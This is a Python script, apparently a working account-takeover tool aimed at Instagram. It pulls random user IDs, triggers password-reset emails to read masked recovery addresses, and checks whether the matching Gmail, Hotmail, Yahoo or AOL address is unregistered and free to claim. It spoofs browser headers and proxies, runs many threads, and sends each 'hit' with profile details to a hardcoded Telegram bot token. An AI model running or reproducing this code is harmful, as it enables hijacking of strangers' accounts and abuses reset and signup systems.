import requests
import string
import zstandard as zstd
from colorama import Fore 
import requests
import string
import requests
import string
import concurrent.futures
import time
import traceback
import requests
import string
import json
from json.decoder import JSONDecodeError
from faker import Faker
from secrets import token_hex
from user_agent import generate_user_agent
import random
from colorama import Fore
from colorama import Fore  # Assuming you use colorama for colored output
import threading
import json
import faker
import re
from urllib.parse import unquote
from colorama import Fore
import requests
import zstandard as zstd
import gzip
import zlib
import json
#from datetime import datetime
from colorama import Fore 
import random
import base64,os
from google.protobuf import message_factory
from google.protobuf.descriptor_pb2 import FileDescriptorProto, DescriptorProto, FieldDescriptorProto
import re
from urllib.parse import urlencode, quote_plus
import string
import requests
import json
import re
import base64
from urllib.parse import parse_qs, urlencode, quote_plus, urlparse
import random,os
from urllib.parse import urlencode, quote_plus
from google.protobuf import message_factory
from google.protobuf.descriptor_pb2 import FileDescriptorProto, DescriptorProto, FieldDescriptorProto
import datetime
from fake_useragent import UserAgent


print('===========================================================================')

############### GET COOKIES 


response = requests.post("https://www.instagram.com/accounts/signup/email/")
cookies = response.cookies.get_dict()
    
first_key, first_value = next(iter(cookies.items()))
extracted_value = cookies[first_key]
full_cookies = {
        first_key: extracted_value
    }



ua = UserAgent()

# Get a random user agent string
random_user_agent = ua.random




session = requests.Session()



################# DECODE CONTENT ################


def decoder(response):
    content_encoding = response.headers.get('Content-Encoding')
    try:
        if content_encoding == 'gzip':
            return gzip.decompress(response.content).decode('utf-8')
        elif content_encoding == 'deflate':
            return zlib.decompress(response.content, -zlib.MAX_WBITS).decode('utf-8')
        elif content_encoding == 'zstd':
            dctx = zstd.ZstdDecompressor()
            return dctx.decompress(response.content).decode('utf-8')
        else:
            return response.text
    except zstd.ZstdError as e:
#        print(f"ZstdError: {e}")
 #        print(f"Content (truncated): {response.content[:500]}")
        return response.content.decode('utf-8')
    except (gzip.BadGzipFile, zlib.error) as e:
        print(f"DecompressionError: {e}")
        print(f"Content (truncated): {response.content[:100]}")
        return response.content.decode('utf-8')
    except UnicodeDecodeError as e:
        print(f"UnicodeDecodeError: {e}")
        print(f"Decoded content (truncated): {response.content[:100]}")
        return response.content.decode('utf-8')
    except Exception as e:
        print(f"Unexpected error: {e}")
        print(f"Content (truncated): {response.content[:100]}")
        return response.content.decode('utf-8')





################# EXTRACT COOKIES FROM URL ################

def header_cookie():

    csrftoken = ""
    ig_did = ""
    mid = ""
    
    response = requests.post("https://www.instagram.com/accounts/signup/email/")
    cookies = response.cookies.get_dict()
    
    first_key, first_value = next(iter(cookies.items()))
    extracted_value = cookies[first_key]
    cookies = {
        first_key: extracted_value
    }
    
    response = session.post('https://www.instagram.com/api/v1/web/login_page/', cookies=cookies)
    for cookie in response.cookies:
        if cookie.name == 'csrftoken':
            csrftoken = cookie.value
        elif cookie.name == 'ig_did':
            ig_did = cookie.value
        elif cookie.name == 'mid':
            mid = cookie.value
    
    return csrftoken, ig_did, mid




########## GENERATE RANDOM USERID



def randomIDGen():
    number1 = 994
    number2 =  555499750
    # Generate a random number between number1 and number2
    random_userId = random.randint(number1, number2)
    return random_userId



######## GET USERNAME FROM USER_ID


def fetch_instagram_data(user_id,decode_error_count=0):
 
    target_id = user_id
    lsd = ''.join(random.choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
    id = str(target_id)
    headers = {
        'accept': '/',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/0s9s/',
        'user-agent': str(generate_user_agent()),
        'x-fb-lsd': 'Tato' + lsd,
    }
    params = {
        'lsd': 'Tato' + lsd,
        'variables': '{"id":"' + id + '","relay_header":false,"render_surface":"PROFILE"}',
        'doc_id': '7397388303713986',
    }


    response = session.post('https://www.instagram.com/api/graphql', headers=headers, params=params)
    try:
        info = response.json()
        print(response.status_code)
        username = info['data']['user']['username']
        if '_' in username or '.' in username:
           pass
        else:     
           return username
    except JSONDecodeError as e:
        if str(e).startswith("Expecting value: line 1 column 1 (char 0)"):
            print(Fore.YELLOW+"RECALLED"+Fore.RESET)
            fetch_instagram_data(user_id,decode_error_count=0)
        else:
            raise  # Re-raise the exception if it's not the specific case we're handling
    except Exception as e:
        return None
        








def sendReset_Mail_insta(csrftoken, ig_did, mid,username):
    ip = ".".join(str(random.randint(0, 255)) for _ in range(4))                                                                                           
    pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
    port = random.choice(pl)
    proxy = ip + ":" + str(port)
    data = {

    'email_or_username': username

    }
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Content-Length": "22",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.instagram.com",
        "Pragma": "no-cache",
        "Priority": "u=1, i",
        "Referer": "https://www.instagram.com/accounts/password/reset/",
        "Sec-Ch-Prefers-Color-Scheme": "light",
        'Cookie': f'csrftoken={csrftoken}; mid={mid}',
        "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "Sec-Ch-Ua-Full-Version-List": '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.127", "Google Chrome";v="126.0.6478.127"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Model": '"Nexus 5"',
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Ch-Ua-Platform-Version": '"6.0"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent":str(generate_user_agent()),
        "X-Asbd-Id": "129477",
        "X-Csrftoken": csrftoken,
        "X-Ig-App-Id": "1217981644879628",
        "X-Ig-Www-Claim": "0",
       'Connection': 'keep-alive',
        "X-Instagram-Ajax": "1014719072",
        "X-Requested-With": "XMLHttpRequest"
    }


    try:
        response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',headers=headers,data=data , proxies={'http': proxy})
        response_result = decoder(response)
        
        print(response.status_code)
        return response_result
    except Exception as e :
        return None




############ MATCH EMAIL 

def Received_gmail_from_link(response_text, username):
    # Extract the email from the response text
    email_match = re.search(r"We sent an email to (.+?) with a link to get back into your account", response_text)
    
    if email_match:
        email = email_match.group(1)
        # Check if email ends with @gmail.com
        if email.endswith("@gmail.com"):
            # Check if the first and last letters of username match the email
            domain= "gmail.com"
            if username[0] == email[0] and username[-1] == email.split('@')[0][-1]:
                
                return username , domain
                
        
                
        elif  email.endswith("@hotmail.com"):    
            domain= "hotmail.com"
            if username[0] == email[0] and username[-1] == email.split('@')[0][-1]:
                
                return username,domain
                
        elif  email.endswith("@a**.com"):    
            domain= "aol.com"
            if username[0] == email[0] and username[-1] == email.split('@')[0][-1]:
                
                return username,domain
                
                
        elif  email.endswith("@yahoo.com"):    
            domain= "yahoo.com"
            if username[0] == email[0] and username[-1] == email.split('@')[0][-1]:
                
                return username,domain                
                
                
                
                
        else:
            return None           
    return None
    
############ SEND MESSAGE TO TELEGRAM


import requests
import string
import time
import os
import json
import random 
import sys
import urllib.parse
from colorama import Fore,init
import threading
from user_agent import generate_user_agent
import time
from uuid import uuid4
from faker import Faker
from secrets import token_hex
from user_agent import generate_user_agent
import re
import datetime
from threading import Thread





def telegram(username,domain):
        token ="7499453795:AAETxkQKf5euE7maLIrxrU6uiLLEpPx87os"
        ID ="5498750492"
        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
        port = random.choice(pl)
        proxy = ip + ":" + str(port)
        uid = uuid4().hex.upper()
        csr = token_hex(8) * 2
        miid = token_hex(13).upper()
        dtr = token_hex(13)
        headers = {
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en;q=0.9',
            'cookie': f'ig_did={uid}; datr={dtr}; mid={miid}; ig_nrcb=1; csrftoken={csr}; ds_user_id=56985317140; dpr=1.25',
            'referer': f'https://www.instagram.com/{username}/?hl=ar',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.138", "Google Chrome";v="112.0.5615.138", "Not:A-Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'viewport-width': '1051',
            'x-asbd-id': '198387',
            'x-csrftoken': str(csr),
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-requested-with': 'XMLHttpRequest',
        }
        rr = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}', headers=headers, proxies={'http': proxy})
        try:
            Id = rr.json()['data']['user']['id']

        except:
            Id = ""
        try:
            name = rr.json()['data']['user']['full_name']
            print(name)
        except:
            name = ""
        try:
            bio = rr.json()['data']['user']['biography']
            print(bio)
        except:
            bio = ""
        try:
            po = rr.json()['data']['user']['edge_owner_to_timeline_media']['count']
        except:
            po = ""
        try:
            fols = rr.json()['data']['user']['edge_followed_by']['count']
        except:
            fols = ""
        try:
            folg = rr.json()['data']['user']['edge_follow']['count']
        except:
            folg = ""
        try:
            pr = rr.json()['data']['user']['is_private']
        except:
            pr = ""
        tim = datetime.datetime.now()

        tlg = f'''
⋘─────━*ZR4R_*━─────⋙
[⬆️]𝐓𝐢𝐦𝐞 ==> {tim}
[💌] 𝐄𝐦𝐚𝐢𝐥  ==> {username+domain}
[👻] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 ==> @{username}
[👱🏻] 𝐍𝐚𝐦𝐞 ==> {name}
[🔺] ??𝐃 ==> {Id}
[🔁] 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 ==> {fols}
[🔂] 𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 ==> {folg}
[📺] 𝐁𝐢𝐨 ==> {bio}
[🎥] 𝐏𝐨𝐬𝐭𝐬 ==> {po}
[📲] 𝐈𝐬 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ==> {pr}
[↩️] 𝐔𝐫𝐥 ==> https://www.instagram.com/{username}
⋘─────━😈🚀━─────⋙
𝐁𝐘 :  @zr4r_'''
        if pr == True:
            print("IT IS PRIVATE SORRY")
        else:        
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')



    



#session = requests.Session()



####################3 DECODE HEADER REQUEST WHEN SEND 

def CheckGoogleAcc_Existence(username):
 def getTl():
    try:
        n1 = ''.join(random.choice("azertyuiopmlkjhgfdsqwxcvbn") for i in range(random.randrange(6, 9)))
        n2 = ''.join(random.choice("azertyuiopmlkjhgfdsqwxcvbn") for i in range(random.randrange(3, 9)))
        host = ''.join(random.choice("azertyuiopmlkjhgfdsqwxcvbn") for i in range(random.randrange(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-YE,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-arch": "\"\"",
            "sec-ch-ua-bitness": "\"\"",
            "sec-ch-ua-full-version": "\"116.0.5845.72\"",
            "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-model": "\"ANY-LX2\"",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua-platform-version": "\"13.0.0\"",
            "sec-ch-ua-wow64": "?0",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
            "x-client-data": "CJjbygE=",
            "x-same-domain": "1",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            'user-agent': str(generate_user_agent()),
        }

        res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
            'user-agent': generate_user_agent(),
        }
        data = {
            'f.req': '["' + tok + '","' + n1 + '","' + n2 + '","' + n1 + '","' + n2 + '",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        try:
            os.remove('tlcok.txt')
        except:
            pass
        tl_cookie = tl  
        host_cookie = host
        return tl_cookie , host_cookie
            
    except Exception as e:
        print(e)
        getTl()


 def CheckGmail(username,tl_cookie, host_cookie):
    
    email = username +'@gmail.com'
    try:
        tl = tl_cookie
        host = host_cookie
    except:
        getTl()
        tl = tl_cookie
        host = host_cookie
    nono = email.split('@')[0]
    cookies = {'__Host-GAPS': host}
    headers = {
        'authority': 'accounts.google.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'google-accounts-xsrf': '1',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=' + tl,
        'user-agent': generate_user_agent(),  
    }
    params = {'TL': tl}
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A' + tl + '%22%2C%22' + nono + '%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = requests.post(
        'https://accounts.google.com/_/signup/usernameavailability',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
    print(response.text)
    if '"gf.uar",1' in str(response.text):
        print(Fore.GREEN+"FOUND HIT !!!!")
        print(Fore.WHITE+"")
        telegram(username,"@gmail.com")
    else:
        print(Fore.RED+"ACCOUNT ALREADY EXISTS")
        print(Fore.WHITE+"")
        


 
 tl_cookie, host_cookie=getTl()
 CheckGmail(username,tl_cookie, host_cookie)



############# CHECK HOTMAIL EXISTENCE 



def HOTMAIL(username):
    domain = '@hotmail.com'
    email = username+domain
    
    response = session.post('https://signup.live.com',headers={
            'user-agent': 'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/122.0.0.0',
        })
    mc = response.cookies.get_dict()['amsc']   
    cookies = {
            'amsc': mc,
        }
        
        
    
    
    content = response.text
    pattern = r'"apiCanary":"(.*?)"'
    match = re.search(pattern, content)
    if match:
        api_canary_value = match.group(1)
        encoded_url = api_canary_value
    # Decode Unicode escape sequences
        decoded_url = bytes(encoded_url, "utf-8").decode("unicode_escape")
    # Replace \u003a with colon :
        decoded_url = decoded_url.replace("\\u003a", ":")
    # Replace \u002b with plus sign +
        decoded_url = decoded_url.replace("\\u002b", "+")
    # Replace \u002f with forward slash /
        decoded_url = decoded_url.replace("\\u002f", "/")
    # Optionally, remove any remaining backslashes
        decoded_url = decoded_url.replace("\\", "")    
        
    headers = {
            'authority': 'signup.live.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'canary': decoded_url,
            'user-agent': 'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/122.0.0.0',
        }

    json_data = {
            'signInName': email,
        }
    
    response = session.post(
            'https://signup.live.com/API/CheckAvailableSigninNames',
            cookies=cookies,
            headers=headers,
            json=json_data,
        ).text
    response_dict = json.loads(response)
# Check the value of the "isAvailable" key and print the message if it's true
    current_time = datetime.datetime.now()
    formatted_time = current_time.strftime("%H:%M") 
    if response_dict.get("isAvailable"):
        
        print(Fore.GREEN+'WE GOT HIT!!!'+Fore.RESET)
        telegram(username,"@hotmail.com")

    else:
        print(Fore.RED+'ACCOUNT ALREADY TAKEN'+Fore.RESET)
        
        
########## YAHOO EXISTENCE 


import requests
import json
import string
import os
from user_agent import generate_user_agent
from bs4 import BeautifulSoup

import re



def YAHOO(username):


    session = requests.Session()

    ################################# EXTRACT ESSENTIAL INFO FOR REQUESTS 

    response = session.get('https://login.yahoo.com/')

    cookies = response.cookies.get_dict()

    AS_value = cookies.get('AS')
    A1_value = cookies.get('A1')
    A3_value = cookies.get('A3')
    A1S_value = cookies.get('A1S')

    pattern = r'<input type="hidden" name="acrumb" value="([^"]*)" />'

    # Use re.search to find the pattern in the content
    match = re.search(pattern, response.text)

    # Check if a match is found
    if match:
        # Extract the value of acrumb
        acrumb_value = match.group(1)

    pattern = r'<input type="hidden" name="sessionIndex" value="([^"]*)" />'

    # Use re.search to find the pattern in the content
    match = re.search(pattern, response.text)

    # Check if a match is found
    if match:
        # Extract the value of acrumb
        sessionIndex_VALUE = match.group(1)


    ##################################################################  

    data= {


        'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":2.0000000596046448,"hardwareConcurrency":4,"timezoneOffset":-330,"timezone":"Asia/Calcutta","sessionStorage":1,"localStorage":1,"indexedDb":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":0,"hash":"24700f9f1986800ab4fcc880530dd0ed"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 520 (0x00001916) Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":1,"hasLiedBrowser":0,"touchSupport":{"points":1,"event":1,"start":1},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"425","h":"478"},"availableResolution":{"w":"478","h":"425"},"ts":{"serve":1721211672224,"render":1721211671677}}',

        'crumb': 'FPA7EYDbzr1qxChJwWHRxg',
        'acrumb': acrumb_value,
        'sessionIndex': sessionIndex_VALUE,
        'displayName': '',
        'deviceCapability': '{"pa":{"status":false},"isWebAuthnSupported":true}',
        'username': username,
        'passwd': '' ,
        'signin': 'Next'

        }



    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Content-Length': '1522',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://yahoo.com/',
        'Pragma': 'no-cache',
        'Priority': 'u=1, i',
        'Referer': 'https://login.yahoo.com/',
        'Cookie':f'A1={A1_value}; A3={A3_value}; gpp=DBAA; gpp_sid=-1; axids=gam=y-jfUfYtZE2uLe63Hi_SZTbVtLhO3qjcdT~A&dv360=eS1lellUWkVaRTJ1RVYuemdXTzJxUUg2MjZfNk1uc0FxUn5B&ydsp=y-HrbutS1E2uJMnGqiJIlZNhOVPov6amtM~A&tbla=y-2ITgH0dE2uJ8s4o.hmjTQIj0ei74CWe1~A; tbla_id=8dfe49cd-f468-46e7-ab58-0920b716b3d3-tuctbef3433; A1S={A1S_value}; cmp=t=1721211662&j=0&u=1---; AS={AS_value}'  ,
        'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'Sec-Ch-Ua-Mobile': '?1',
        'Sec-Ch-Ua-Platform': '"Android"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': str(generate_user_agent()),
        'X-Requested-With': 'XMLHttpRequest'
    }

    url = 'https://login.yahoo.com/'

    response = session.post(url,headers=headers,data=data)
    jsontext = json.loads(response.text)
    print(response.text)
    if jsontext.get('errorMsg')== "Sorry, we don't recognize this email.":
        print(Fore.GREEN+"FOUND HIT !!!!")
        print(Fore.WHITE+"")
        telegram(username,"@yahoo.com")
    else:
        print(Fore.RED+'ACCOUNT ALREADY TAKEN'+Fore.RESET)
        
        
########### CHECK AOL EXISTENCE



import requests
import json
import string
import os
from user_agent import generate_user_agent
from bs4 import BeautifulSoup

import re



def AOL(username):


    session = requests.Session()

    ################################# EXTRACT ESSENTIAL INFO FOR REQUESTS 

    response = session.get('https://login.aol.com/')

    cookies = response.cookies.get_dict()

    AS_value = cookies.get('AS')
    A1_value = cookies.get('A1')
    A3_value = cookies.get('A3')
    A1S_value = cookies.get('A1S')

    pattern = r'<input type="hidden" name="acrumb" value="([^"]*)" />'

    # Use re.search to find the pattern in the content
    match = re.search(pattern, response.text)

    # Check if a match is found
    if match:
        # Extract the value of acrumb
        acrumb_value = match.group(1)

    pattern = r'<input type="hidden" name="sessionIndex" value="([^"]*)" />'

    # Use re.search to find the pattern in the content
    match = re.search(pattern, response.text)

    # Check if a match is found
    if match:
        # Extract the value of acrumb
        sessionIndex_VALUE = match.group(1)


    ##################################################################  

    data= {


        'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":2.0000000596046448,"hardwareConcurrency":4,"timezoneOffset":-330,"timezone":"Asia/Calcutta","sessionStorage":1,"localStorage":1,"indexedDb":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":0,"hash":"24700f9f1986800ab4fcc880530dd0ed"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 520 (0x00001916) Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":1,"hasLiedBrowser":0,"touchSupport":{"points":1,"event":1,"start":1},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"425","h":"478"},"availableResolution":{"w":"478","h":"425"},"ts":{"serve":1721211672224,"render":1721211671677}}',

        'crumb': 'FPA7EYDbzr1qxChJwWHRxg',
        'acrumb': acrumb_value,
        'sessionIndex': sessionIndex_VALUE,
        'displayName': '',
        'deviceCapability': '{"pa":{"status":false},"isWebAuthnSupported":true}',
        'username': username,
        'passwd': '' ,
        'signin': 'Next'

        }



    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Content-Length': '1522',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://login.aol.com',
        'Pragma': 'no-cache',
        'Priority': 'u=1, i',
        'Referer': 'https://login.aol.com/',
        'Cookie':f'A1={A1_value}; A3={A3_value}; gpp=DBAA; gpp_sid=-1; axids=gam=y-jfUfYtZE2uLe63Hi_SZTbVtLhO3qjcdT~A&dv360=eS1lellUWkVaRTJ1RVYuemdXTzJxUUg2MjZfNk1uc0FxUn5B&ydsp=y-HrbutS1E2uJMnGqiJIlZNhOVPov6amtM~A&tbla=y-2ITgH0dE2uJ8s4o.hmjTQIj0ei74CWe1~A; tbla_id=8dfe49cd-f468-46e7-ab58-0920b716b3d3-tuctbef3433; A1S={A1S_value}; cmp=t=1721211662&j=0&u=1---; AS={AS_value}'  ,
        'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'Sec-Ch-Ua-Mobile': '?1',
        'Sec-Ch-Ua-Platform': '"Android"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': str(generate_user_agent()),
        'X-Requested-With': 'XMLHttpRequest'
    }

    url = 'https://login.aol.com/'

    response = session.post(url,headers=headers,data=data)
    jsontext = json.loads(response.text)
    print(response.text)
    if jsontext.get('errorMsg')== "Sorry, we don't recognize this email.":
        print(Fore.GREEN+"FOUND HIT !!!!")
        print(Fore.WHITE+"")
        telegram(username,"@aol.com")
    else:
        print(Fore.RED+'ACCOUNT ALREADY TAKEN'+Fore.RESET)






 




             

           

##########################################

################### CALL FUNCTIONS  for getting cookies 



# Define your steps with improved error handling and logging

import concurrent.futures
import random
from colorama import Fore

def process_task(i):
    csrftoken, ig_did, mid = header_cookie()    # COLLECT COOKIES
    user_id = randomIDGen()

    print(user_id)
    #############  CALL FUNCTIONS for getting username

    print(Fore.YELLOW+ f"{i}")
    print(Fore.WHITE+ "")
    username = fetch_instagram_data(user_id,decode_error_count=0)
    if username:
        print(Fore.BLUE+ f"UserName: {username}")
        print(Fore.WHITE+ "")
        print("Step 1 done")
    else:
        print(Fore.RED+'Username not found')
        print(Fore.WHITE+'')
        os.system('clear')
        return None

    # SEND RESET LINK ON INSTAGRAM
    response_result = sendReset_Mail_insta(csrftoken, ig_did, mid, username)
    if response_result:
        print(f"DONE STEP 2")
        print(response_result)
    else:
        print(Fore.RED+'SOMETHING WENT WRONG STEP 3')
        print(Fore.WHITE+'')
        return None

    result = Received_gmail_from_link(response_result, username)
      
    if result:
        username, domain = result
        if domain == "gmail.com":
            print(f"DONE STEP 3")
            print(username)
            
            CheckGoogleAcc_Existence(username)
            
        elif domain == "hotmail.com":
            print(f"DONE STEP 3")
            print(username)
            
            HOTMAIL(username)
            
        elif domain == "yahoo.com":
            print(f"DONE STEP 3")
            print(username)
            
            YAHOO(username)    
            
        elif domain == "aol.com":
            print(f"DONE STEP 3")
            print(username)
            
            AOL(username)
    else:
        print(Fore.RED+'SOMETHING WENT WRONG STEP'+Fore.RESET)

if __name__ == "__main__":
    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
        futures = [executor.submit(process_task, i) for i in range(150)]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Generated an exception: {e}")
                
